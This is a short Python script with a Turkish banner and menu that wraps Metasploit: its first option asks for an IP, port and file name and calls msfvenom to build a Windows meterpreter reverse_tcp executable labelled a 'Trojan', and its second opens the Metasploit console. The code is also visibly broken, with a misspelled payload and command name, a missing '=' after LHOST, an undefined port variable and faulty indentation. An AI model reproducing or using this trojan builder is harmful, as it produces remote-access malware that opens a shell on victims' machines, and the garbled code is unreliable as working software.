import os
os.system('clear')
banner='''
 # # # # # # # # # # # #  # # # # # # # # # #  # # # # # # # # # 
 # UYARI SORUMLULUK KABUL ETMEM HERAN GİB BİR GİRİŞİMDE !!!!!! #
 #                CODER BY HZDORAEMON
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
 '''
 print (banner)

 print ('''
 1] Trojan oluştur
 2] Metasploit ac ''')
 girdi=input('-------->')
 if (girdi==1):

         ip=raw_input('ip adresini giriniz ------>')
         ip=raw_input('portu giriniz----->') 
         ismin=raw_input('trojan ismi----->')
         os.system('clear && msfvenom -p windwos/meterpreter/reverse_tcp LHOST'+ip+' LPORT='+port+' -f exe -o '+ismin)
if (girdi==2):

    os.system('msvconsele')